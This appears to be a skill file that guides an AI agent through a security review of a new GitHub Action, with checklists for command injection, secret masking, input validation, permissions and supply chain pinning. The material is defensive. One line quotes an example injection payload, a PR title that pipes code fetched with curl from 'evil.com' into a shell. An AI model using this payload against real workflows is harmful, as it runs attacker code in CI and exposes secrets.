---
name: secure-action
description: "Phase 6: Security assessment of a GitHub Action. Checks input sanitization, command injection, secret handling, permissions, and supply chain risks."
---

# Secure Action - Phase 6: Security Assessment

You are performing a security review of a newly created GitHub Action in the Bitwarden `gh-actions` repository. This is the final quality gate before the action is considered ready.

## Procedure

### Step 1: Read All Files

Read every file in the `{action-name}/` directory and the test workflow at `.github/workflows/test-{action-name}.yml`. Also read `{action-name}/SPEC.md` to understand which inputs are sensitive.

### Step 2: Command Injection Prevention

**Critical check** — this is the most common vulnerability in GitHub Actions.

For composite actions, check every `run:` block:
- [ ] No `${{ inputs.* }}` expressions directly in `run:` commands. These MUST go through `env:` blocks.
- [ ] No `${{ github.event.* }}` expressions in `run:` commands (attacker-controlled in PRs).
- [ ] No unquoted variable expansions in bash (e.g., `$VAR` should be `"$VAR"`).
- [ ] No `eval`, backtick command substitution, or `$(...)` on untrusted input.

**Why**: An attacker can craft a PR title like `"; curl evil.com | sh; echo "` which gets injected into shell commands when `${{ }}` expressions are used inline.

**Fix pattern** — use environment variables:
```yaml
# BAD - injectable
run: echo "${{ inputs.name }}"

# GOOD - safe
env:
  NAME: ${{ inputs.name }}
run: echo "$NAME"
```

For TypeScript actions:
- [ ] No `exec.exec()` or `child_process` calls with unvalidated input
- [ ] If shell commands are needed, inputs are properly escaped

For Python actions:
- [ ] No `os.system()`, `subprocess.call(shell=True)` with unvalidated input
- [ ] Use `subprocess.run()` with argument lists, not shell strings

### Step 3: Secret Handling

- [ ] Inputs marked as sensitive in SPEC.md are never logged, echoed, or printed
- [ ] TypeScript: sensitive values use `core.setSecret(value)` before any output
- [ ] Composite: sensitive values are not in `echo` statements or `::debug::` annotations
- [ ] Python: sensitive values are not in `print()` or logging statements
- [ ] Sensitive outputs are masked before being set
- [ ] No secrets in error messages (a caught exception might contain a secret in its message)

### Step 4: Input Validation

- [ ] All inputs are validated before use (type, format, allowed values)
- [ ] File path inputs are validated against directory traversal (`../`, absolute paths)
- [ ] URL inputs are validated for scheme (no `file://`, `javascript:`, etc.)
- [ ] Numeric inputs are validated as actual numbers
- [ ] Enum inputs are validated against allowed values
- [ ] No input is trusted implicitly — validate at the boundary

### Step 5: Permissions Audit

For the test workflow:
- [ ] Uses least-privilege `permissions` (e.g., `contents: read` not `contents: write` unless needed)
- [ ] No `permissions: write-all` or overly broad permissions
- [ ] `GITHUB_TOKEN` is not passed where it's not needed

For the action itself:
- [ ] Document required permissions in README.md
- [ ] Action does not request more permissions than specified in SPEC.md

### Step 6: Supply Chain Security

- [ ] All external actions in the test workflow are pinned to commit SHA (not tag or branch)
- [ ] All npm dependencies (TypeScript) are pinned to specific versions
- [ ] Docker base images use specific tags or digests
- [ ] No `curl | sh` or equivalent patterns
- [ ] No downloading and executing untrusted code

### Step 7: Information Disclosure

- [ ] Error messages do not leak sensitive information (file paths, tokens, internal URLs)
- [ ] Debug output does not contain secrets
- [ ] Action outputs do not inadvertently contain sensitive data
- [ ] Log output is appropriate — not too verbose with internal details

### Step 8: Produce Security Assessment

Append to SPEC.md under `## Phase 6: Security Assessment`:

```markdown
## Phase 6: Security Assessment

### Status: PASS / FAIL

### Findings
| # | Severity | Category | Description | Status |
|---|----------|----------|-------------|--------|
| 1 | ... | ... | ... | Fixed / Flagged |

### Summary
{Overall assessment and any remaining recommendations}
```

Severity levels:
- **Critical**: Exploitable vulnerability (command injection, secret leak). Must be fixed.
- **High**: Security weakness likely to be exploited. Must be fixed.
- **Medium**: Defense-in-depth issue. Should be fixed.
- **Low**: Best practice recommendation. Fix if easy, otherwise document.

### Step 9: Convert SPEC.md to CLAUDE.md

After the security assessment passes, convert `{action-name}/SPEC.md` into `{action-name}/CLAUDE.md`:
1. Read `report-deployment-status-to-slack/CLAUDE.md` as the reference template
2. Transform the spec into developer-facing documentation following that pattern:
   - Action Overview (type, characteristics, dependencies)
   - Architecture (execution flow, key patterns)
   - Integration Points
   - Modification Guidelines
   - Security Considerations
   - Common Patterns (usage examples)
3. Remove the phase result sections (those were internal)
4. Delete SPEC.md (its purpose is served)

## Important Rules

- Fix all Critical and High findings immediately. Do not just report them.
- For Medium findings, fix them directly.
- For Low findings, document them in the assessment for user awareness.
- This is a blocking gate: if Critical issues cannot be resolved, flag to the user.
- Be thorough but avoid false positives. Only flag real risks, not theoretical ones.
- The command injection check on `${{ }}` in `run:` blocks is the single most important check. Do NOT skip it.
